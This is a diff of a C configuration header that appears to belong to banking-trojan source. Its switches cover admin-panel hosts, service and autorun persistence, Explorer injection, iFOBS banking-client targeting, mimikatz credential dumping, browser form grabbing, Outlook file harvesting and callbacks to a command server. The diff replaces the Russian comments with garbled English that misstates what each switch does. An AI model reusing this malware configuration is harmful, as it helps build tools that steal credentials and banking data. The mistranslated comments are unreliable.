@@ -1,6 +1,6 @@
 #pragma once
 
-//полная релизная версия
+//The final balance
 #include "..\builder.h"
 
 #define ADMIN_PANEL_HOSTS MASK_ADMIN_PANEL_HOSTS
@@ -13,39 +13,39 @@
 #define PERIOD_CONTACT MASK_PERIOD_CONTACT
 #define MISC_STATE MASK_MISC_STATE
 
-//настройки для отключения разных функций
-//отключить установку сервиса
+//Settling up for the connection of distant effects
+//Turning down the system
 //#define OFF_SERVICE
 //#define OFF_SDPROP
-//отключить уставновку в автозапуск (в тот что в меню винды)
+//talk about how to set it up (at the end of time)
 //#define OFF_AUTORUN
-//все отсылаемые данные (скриншоты, логи) ложатся в папку c:\botdebug
+//in the case of the most remote (crooked, crooked) users in the c: \ botdebug
 //#define ON_SENDDATA_FOLDER
-//все плагины берутся из папки c:\plugins
+// in the process of using the buttons with: \ plugins
 //#define ON_PLUGINS_FOLDER
 
 #define ON_VIDEOSERVER
-//при работе не использовать проводник (не инжектится в него)
+// Inspiration and decontamination of perfomance (in addition in pertinent)
 #define NOT_EXPLORER
-//подключение ифобс
+//Completion of the image
 //#define ON_IFOBS
-//подключение функций из программы mimikatz
+//How to use the mimikatz interface
 #ifndef WIN64
 #define ON_MIMIKATZ
 #endif
-//включает граббинг данных с форм браузера
+//Achievement of the control panels
 //#define ON_FORMGRABBER
 
-//включение вложенных плагинов
+//closing the backends
 //#define PLUGINS_TRUSTED_HOSTS
 //#define PLUGINS_FIND_OUTLOOK_FILES
-//после поиска нужно завершить работу бота
+//On the basis of how to do this, and on how to do it
 //#define PLUGINS_FIND_OUTLOOK_FILES_EXIT
 //#define PLUGINS_MONITORING_FILE
 
-//запрашивает IP админки и при получении корректного адреса запускает серверную часть которая коннектится по этому IP
+//Create IP addresses and use the software to set the quality of the software to use the software for a set of programs using the software to use the software.
 //#define IP_SERVER_FROM_DNS
-//стучать на зашитый внешней прогой IP сервера
+//How to set up a connection with a top-down IP address
 //#define IP_SERVER_EXTERNAL_IP
 
 #define PUBLIC_KEY MASK_PUBLIC_KEY
